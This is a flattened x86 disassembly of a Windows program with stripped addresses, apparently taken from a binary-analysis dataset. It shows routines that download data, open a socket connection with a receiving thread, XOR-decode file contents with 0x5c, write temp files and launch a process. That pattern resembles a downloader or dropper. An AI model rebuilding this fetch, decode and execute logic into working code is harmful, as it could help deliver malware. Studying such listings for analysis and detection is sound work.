je r-xdata
push edi
call esi
mov eax esi
cmp esi 0xc800
cmovae eax ecx
lea ecx [ ebp - 0xccbc ]
push ecx
push eax
lea eax [ ebp - 0xcc6c ]
push eax
push edi
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xcd28 ]
test eax eax
je r-xdata
push eax
call esi
mov al [ ebp - 0xcd1d ]
push r--data
test al al
je r-xdata
push eax
call esi
mov ecx ebx
call sub_401430
lea ecx [ ebp - 0xcc9c ]
call sub_401490
lea ecx [ ebp - 0xccb8 ]
call sub_408000
lea ecx [ ebp - 0xccd4 ]
call sub_401430
mov [ ebp - 0x4 ] 0x4
mov edi [ ebp - 0xcc8c ]
mov esi 0xb
add edi 0xfffffff5
xor bl bl
cmp edi esi
jle r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
mov edi edi
mov edx r--data
lea ecx [ ebp - 0xccd4 ]
call sub_40e790
test al al
je r-xdata
lea edx [ ebp - 0xccd4 ]
lea ecx [ ebp - 0xcc84 ]
call sub_40f460
push eax
lea ecx [ ebp - 0xccd4 ]
call sub_40b1b0
lea ecx [ ebp - 0xcc84 ]
call sub_401490
test al al
movzx ebx bl
mov eax 0x1
push 0x9
cmovne ebx eax
push esi
lea eax [ ebp - 0xcc9c ]
push eax
lea ecx [ ebp - 0xcc84 ]
mov [ ebp - 0xcc70 ] 0xf
mov [ ebp - 0xcc74 ] 0x0
mov [ ebp - 0xcc84 ] 0x0
call sub_401500
mov edx r--data
lea ecx [ ebp - 0xcc84 ]
mov [ ebp - 0x4 ] 0x6
call sub_40e490
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xcc70 ] 0x10
mov [ ebp - 0xcd1d ] al
jb r-xdata
push [ ebp - 0xcc84 ]
call j_sub_417912#2
mov al [ ebp - 0xcd1d ]
add esp 0x4
mov ecx [ ebp - 0xcd2c ]
push r--data
call sub_401430
jmp r-xdata
lea ecx [ ebp - 0xcd1d ]
call sub_4086b0
cmp [ ebp - 0xccc0 ] 0x10
push [ ebp - 0xccc4 ]
lea eax [ ebp - 0xccd4 ]
cmovae eax [ ebp - 0xccd4 ]
push eax
call sub_408740
mov esi eax
push esi
lea ecx [ ebp - 0xcc84 ]
call sub_401430
push esi
mov [ ebp - 0x4 ] 0x7
call sub_417912
mov ecx [ ebp - 0xcd2c ]
add esp 0x4
lea eax [ ebp - 0xcc84 ]
push eax
call sub_40b140
lea ecx [ ebp - 0xcc84 ]
call sub_401490
test al al
je r-xdata
push [ ebp - 0xcc84 ]
call j_sub_417912#2
mov al [ ebp - 0xcd1d ]
add esp 0x4
lea ecx [ ebp - 0xccd4 ]
call sub_401490
lea ecx [ ebp - 0xcc9c ]
call sub_401490
lea ecx [ ebp - 0xccb8 ]
call sub_408000
mov eax [ ebp - 0xcd2c ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
test bl bl
je r-xdata
xor bl bl
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
cmp [ ebp - 0xcc88 ] 0x10
lea eax [ ebp - 0xcc9c ]
cmovae eax [ ebp - 0xcc9c ]
lea ecx [ ebp - 0xccd4 ]
mov al [ eax + esi ]
mov [ ebp - 0xcd28 ] al
push [ ebp - 0xcd28 ]
push 0x1
call sub_40c840
push 0xb
lea eax [ esi - 0xb ]
push eax
lea eax [ ebp - 0xcc9c ]
push eax
lea ecx [ ebp - 0xcc84 ]
mov [ ebp - 0xcc70 ] 0xf
mov [ ebp - 0xcc74 ] 0x0
mov [ ebp - 0xcc84 ] 0x0
call sub_401500
mov edx r--data
lea ecx [ ebp - 0xcc84 ]
mov [ ebp - 0x4 ] 0x5
call sub_40e490
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xcc70 ] 0x10
mov [ ebp - 0xcd1d ] al
jb r-xdata
sub_40fdb0
push ebp
mov ebp esp
mov eax 0x2804
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x2800
lea eax [ ebp - 0x2804 ]
push 0x0
push eax
call sub_41cae0
mov edi [ Ordinal_WSOCK32_16@IAT ]
add esp 0xc
lea eax [ ebp - 0x2804 ]
push 0x0
push 0x27ff
push eax
push [ esi + 0x10 ]
call edi
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov ebx [ Sleep@IAT ]
push [ esi + 0x10 ]
call [ Ordinal_WSOCK32_3@IAT ]
push esi
call j_sub_417912#2
mov ecx [ ebp - 0x4 ]
add esp 0x4
xor ecx ebp
pop edi
pop esi
xor eax eax
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] 0x0
movq xmm0 [ esi ]
mov ecx [ esi + 0x14 ]
push eax
mov edx [ ecx ]
lea eax [ ebp - 0x2804 ]
push eax
push [ esi + 0x10 ]
sub esp 0x10
mov eax esp
movq [ eax ] xmm0
movq xmm0 [ esi + 0x8 ]
movq [ eax + 0x8 ] xmm0
call [ edx + 0x4 ]
push 0x3e8
call ebx
push 0x2800
lea eax [ ebp - 0x2804 ]
push 0x0
push eax
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x2804 ]
push 0x0
push 0x27ff
push eax
push [ esi + 0x10 ]
call edi
cmp eax 0xffffffff
jne r-xdata
test eax eax
je r-xdata
sub_40fea0
push ebp
mov ebp esp
push 0xffffffff
push sub_430a78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0xc ]
lea eax [ ebp - 0x1b4 ]
push eax
lea edi [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x0
push 0x2
mov [ edi ] 0x0
call [ Ordinal_WSOCK32_115@IAT ]
test eax eax
jne r-xdata
call [ Ordinal_WSOCK32_116@IAT ]
xor bl bl
jmp r-xdata
push [ ebp + 0x8 ]
xorps xmm0 xmm0
mov eax 0x2
movq [ ebp - 0x24 ] xmm0
movq [ ebp - 0x1c ] xmm0
mov [ ebp - 0x24 ] ax
call [ Ordinal_WSOCK32_9@IAT ]
cmp [ ebp + 0x28 ] 0x10
mov [ ebp - 0x22 ] ax
lea eax [ ebp + 0x14 ]
cmovae eax [ ebp + 0x14 ]
push eax
call [ Ordinal_WSOCK32_10@IAT ]
push 0x6
push 0x1
push 0x2
mov [ ebp - 0x20 ] eax
call [ Ordinal_WSOCK32_23@IAT ]
push 0x10
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov [ ebx ] eax
call [ Ordinal_WSOCK32_4@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x28 ] 0x10
jb r-xdata
push 0x1c
call sub_41775f
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_417912#2
add esp 0x4
xor ecx ecx
xorps xmm0 xmm0
movq [ ecx ] xmm0
movq [ ecx + 0x8 ] xmm0
movq [ ecx + 0x10 ] xmm0
mov [ ecx + 0x18 ] 0x0
jmp r-xdata
mov eax [ ebx ]
push 0x0
push 0x0
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x10 ]
push ecx
mov [ ecx + 0x14 ] eax
movq xmm0 [ ebp - 0x24 ]
push sub_40fdb0
movq [ ecx ] xmm0
movq xmm0 [ ebp - 0x1c ]
push 0x0
push 0x0
movq [ ecx + 0x8 ] xmm0
mov [ ecx + 0x18 ] edi
call [ CreateThread@IAT ]
movq xmm0 [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
movq [ esi ] xmm0
movq xmm0 [ ebp - 0x1c ]
movq [ esi + 0x8 ] xmm0
mov [ esi + 0x2 ] ax
mov eax [ ebx ]
mov [ esi + 0x10 ] eax
mov [ edi ] 0x1
mov bl 0x1
sub_410010
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add eax eax
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_410080
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ rw-data ] 0x0
cmp ecx eax
je r-xdata
push eax
call j_sub_417912#2
add esp 0x4
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push eax
call j_sub_417912#2
pop ecx
retn
push esi
mov esi [ ecx ]
push ecx
call j_sub_417912#2
mov eax [ rw-data ]
add esp 0x4
mov ecx esi
cmp esi eax
jne r-xdata
pop esi
sub_410100
push ebp
mov ebp esp
push 0xffffffff
push sub_430a53
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
push 0x0
mov [ ebp - 0x14 ] rw-data
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_410320
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov [ rw-data ] 0x3f800000
mov [ rw-data ] 0x0
call sub_40ddf0
mov [ rw-data ] 0x7
mov [ rw-data ] 0x8
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_4101d0
push edi
mov edi ecx
mov eax [ edi ]
mov edx [ eax ]
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov [ edi + 0x4 ] 0x0
cmp edx [ edi ]
je r-xdata
push [ edi ]
call j_sub_417912#2
add esp 0x4
pop edi
retn
push esi
lea ebx [ ebx ]
mov esi [ edx ]
push edx
call j_sub_417912#2
add esp 0x4
mov edx esi
cmp esi [ edi ]
jne r-xdata
pop esi
sub_410210
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_41682d
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + ebx ]
cmp edi 0x7ffffffe
ja r-xdata
push r--data
call sub_41682d
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
test edi edi
jne r-xdata
push ecx
push edi
mov ecx esi
call sub_408520
test edi edi
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_4102d0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4102d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push edi
lea edi [ ecx + edx * 2 ]
test eax eax
je r-xdata
mov ecx [ ecx ]
mov ax [ ebp + 0x10 ]
mov [ ecx + edx * 2 ] ax
pop ebp
retn 0xc
mov ecx [ ecx ]
pop edi
pop ebp
retn 0xc
mov ecx eax
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_410320
push ebp
mov ebp esp
push 0x1c
call sub_41775f
add esp 0x4
test eax eax
je r-xdata
call sub_4167fc
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx eax
mov edx eax
jmp r-xdata
pop ebp
retn 0x8
mov [ ecx ] edx
mov [ eax ] ecx
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub_410360
push ebp
mov ebp esp
push 0xffffffff
push sub_430b28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x30 ] eax
test eax eax
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_40c840
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
push ebx
push eax
push [ ebp - 0x30 ]
push edi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_40b140
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov edi [ edi ]
push [ ebp - 0x2c ]
call j_sub_417912#2
add esp 0x4
sub_410470
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0x206
push eax
mov [ ebp - 0x414 ] ax
lea eax [ ebp - 0x412 ]
push eax
mov [ ebp - 0x418 ] 0x0
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x414 ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x20c ]
push eax
push 0x0
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call [ CreateDirectoryW@IAT ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ ebp - 0x20c ] ax
je r-xdata
push eax
lea eax [ ebp - 0x20c ]
push eax
mov ecx esi
call sub_408240
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
sub_410580
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push 0x208
lea eax [ ebp - 0x414 ]
push 0x0
push eax
mov [ ebp - 0x418 ] 0x0
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x414 ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x20c ]
push eax
push 0x0
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ GetTempFileNameW@IAT ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ ebp - 0x20c ] ax
jne r-xdata
lea ecx [ ebp - 0x20c ]
lea edx [ ecx + 0x2 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ecx
lea eax [ ebp - 0x20c ]
push eax
mov ecx esi
call sub_408240
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub ecx edx
sar ecx 0x1
sub_410670
push ebp
mov ebp esp
mov eax 0x103c
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push ecx
push eax
lea eax [ ebp - 0x103c ]
push eax
call sub_410360
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push r--data
push eax
call sub_419924
add esp 0x8
cmp [ ebp - 0x1028 ] 0x10
mov esi eax
jb r-xdata
mov eax [ eax ]
push ecx
push edi
lea eax [ ebp - 0x1024 ]
push eax
mov [ ebp - 0x1028 ] 0xf
mov [ ebp - 0x102c ] 0x0
mov [ ebp - 0x103c ] 0x0
call sub_410360
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x103c ]
call j_sub_417912#2
add esp 0x4
push r--data
push eax
call sub_419924
add esp 0x8
cmp [ ebp - 0x1010 ] 0x10
mov edi eax
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x1010 ] 0xf
mov [ ebp - 0x1014 ] 0x0
mov [ ebp - 0x1024 ] 0x0
test esi esi
je r-xdata
push [ ebp - 0x1024 ]
call j_sub_417912#2
add esp 0x4
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
xor al al
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
test edi edi
je r-xdata
push esi
call sub_419939
add esp 0x4
test eax eax
jne r-xdata
push esi
call sub_4184ba
add esp 0x4
push edi
call sub_4184ba
add esp 0x4
mov al 0x1
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
lea esp [ esp ]
push edi
push eax
lea eax [ ebp - 0x100c ]
push 0x1
push eax
call sub_417f55
push esi
call sub_419939
add esp 0x14
test eax eax
je r-xdata
lea ecx [ ecx ]
push esi
push 0x1000
lea eax [ ebp - 0x100c ]
push 0x1
push eax
call sub_417d52
add esp 0x10
xor edx edx
test eax eax
jle r-xdata
inc edx
cmp edx eax
jl r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ ebp + edx - 0x100c ]
test cl cl
je r-xdata
xor cl 0x5c
mov [ ebp + edx - 0x100c ] cl
sub_410800
push ebp
mov ebp esp
mov eax 0x103c
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push ecx
push eax
lea eax [ ebp - 0x1038 ]
push eax
call sub_410360
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push r--data
push eax
call sub_419924
add esp 0x8
cmp [ ebp - 0x1024 ] 0x10
mov esi eax
jb r-xdata
mov eax [ eax ]
push ecx
push edi
lea eax [ ebp - 0x1020 ]
push eax
mov [ ebp - 0x1024 ] 0xf
mov [ ebp - 0x1028 ] 0x0
mov [ ebp - 0x1038 ] 0x0
call sub_410360
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x1038 ]
call j_sub_417912#2
add esp 0x4
push r--data
push eax
call sub_419924
add esp 0x8
cmp [ ebp - 0x100c ] 0x10
mov ebx eax
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x100c ] 0xf
mov [ ebp - 0x1010 ] 0x0
mov [ ebp - 0x1020 ] 0x0
test esi esi
je r-xdata
push [ ebp - 0x1020 ]
call j_sub_417912#2
add esp 0x4
cmp [ edi + 0x14 ] 0x8
jb r-xdata
test ebx ebx
je r-xdata
push edi
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
mov edi [ edi ]
push 0xfff
lea eax [ ebp - 0x1007 ]
push 0x0
push eax
mov [ ebp - 0x1008 ] 0x0
call sub_41cae0
add esp 0xc
push 0x0
push 0xc800
push esi
call sub_4183cf
add esp 0xc
push esi
call sub_419939
add esp 0x4
test eax eax
jne r-xdata
push esi
call sub_4184ba
add esp 0x4
push ebx
call sub_4184ba
add esp 0x4
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
lea ebx [ ebx ]
push esi
push 0x1000
lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_417d52
push ebx
push eax
lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_417f55
push esi
call sub_419939
add esp 0x24
test eax eax
je r-xdata
sub_4109a0
push ebp
mov ebp esp
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push 0x40
lea eax [ ebp - 0x50 ]
push 0x0
push eax
mov [ ebp - 0x54 ] 0x44
call sub_41cae0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov eax 0x5
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] ax
jb r-xdata
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push 0x0
push 0x0
push 0x10
push 0x0
push 0x0
push 0x0
push esi
push 0x0
call [ CreateProcessW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov esi [ esi ]
mov ecx [ ebp - 0x8 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x60 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x64 ]
call esi
sub_410a30
push ebp
mov ebp esp
push 0xffffffff
push sub_430aed
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x294 ]
push eax
call sub_410580
push r--data
mov edx eax
lea ecx [ ebp - 0x260 ]
mov [ ebp - 0x4 ] 0x0
call sub_410d60
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x280 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x294 ] ax
lea eax [ ebp - 0x260 ]
push eax
push esi
mov [ ebp - 0x280 ] 0x7
mov [ ebp - 0x284 ] 0x0
call sub_410800
test al al
jne r-xdata
push [ ebp - 0x294 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x27c ]
push eax
call sub_410580
push r--data
mov edx eax
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x3
call sub_410d60
add esp 0x4
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x268 ] 0x8
jb r-xdata
xor bl bl
jmp r-xdata
xor eax eax
mov [ ebp - 0x27c ] ax
push ecx
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x260 ]
push eax
mov [ ebp - 0x268 ] 0x7
mov [ ebp - 0x26c ] 0x0
call sub_410670
cmp [ ebp - 0x24c ] 0x8
mov edi [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x260 ]
cmovae ecx [ ebp - 0x260 ]
push ecx
mov bl al
call edi
test bl bl
je r-xdata
push [ ebp - 0x27c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x24c ] 0x8
jb r-xdata
cmp [ ebp - 0x234 ] 0x8
jb r-xdata
lea eax [ ebp - 0x230 ]
push eax
call sub_410470
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x21c ] 0x8
lea edx [ ebp - 0x230 ]
cmovae edx [ ebp - 0x230 ]
cmp [ ebp - 0x234 ] 0x8
lea ecx [ ebp - 0x248 ]
cmovae ecx [ ebp - 0x248 ]
call sub_405640
cmp [ ebp - 0x234 ] 0x8
lea ecx [ ebp - 0x248 ]
cmovae ecx [ ebp - 0x248 ]
push ecx
mov esi eax
call edi
test esi esi
jne r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x260 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ ebp - 0x234 ] 0x7
mov [ ebp - 0x238 ] 0x0
mov [ ebp - 0x248 ] ax
push [ ebp - 0x248 ]
call j_sub_417912#2
add esp 0x4
xor bl bl
xor eax eax
push 0x206
push eax
mov [ ebp - 0x218 ] ax
lea eax [ ebp - 0x216 ]
push eax
call sub_41cae0
mov edx [ ebp - 0x220 ]
add esp 0xc
xor ecx ecx
test edx edx
jle r-xdata
xor eax eax
mov [ ebp - 0x21c ] 0x7
mov [ ebp - 0x220 ] 0x0
mov [ ebp - 0x230 ] ax
push [ ebp - 0x230 ]
call j_sub_417912#2
add esp 0x4
cmp [ rw-data ] 0x8
mov eax rw-data
cmovae eax [ rw-data ]
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ PathAppendW@IAT ]
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x27c ]
cmp [ eax ] 0x0
lea eax [ ebp - 0x218 ]
push eax
je r-xdata
mov esi [ ebp - 0x21c ]
mov edi [ ebp - 0x230 ]
jmp r-xdata
mov [ ebp - 0x261 ] 0x1
call sub_407fa0
lea eax [ ebp - 0x261 ]
push eax
lea eax [ ebp - 0x27c ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_4144e0
call sub_407fa0
lea eax [ ebp - 0x27c ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_4109a0
jmp r-xdata
cmp esi 0x8
lea eax [ ebp - 0x230 ]
cmovae eax edi
inc ecx
mov ax [ eax + ecx * 2 - 0x2 ]
mov [ ebp + ecx * 2 - 0x21a ] ax
cmp ecx edx
jl r-xdata
test bl bl
je r-xdata
push [ ebp - 0x27c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x268 ] 0x8
mov bl al
jb r-xdata
mov bl 0x1
jmp r-xdata
cmp [ ebp - 0x21c ] 0x8
jb r-xdata
sub_410d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
cmp [ ecx ] 0x0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov esi ecx
lea edx [ esi + 0x2 ]
xor esi esi
jmp r-xdata
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi edx
sar esi 0x1
push esi
push ecx
mov ecx ebx
call sub_410e00
mov esi eax
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add eax eax
push eax
push esi
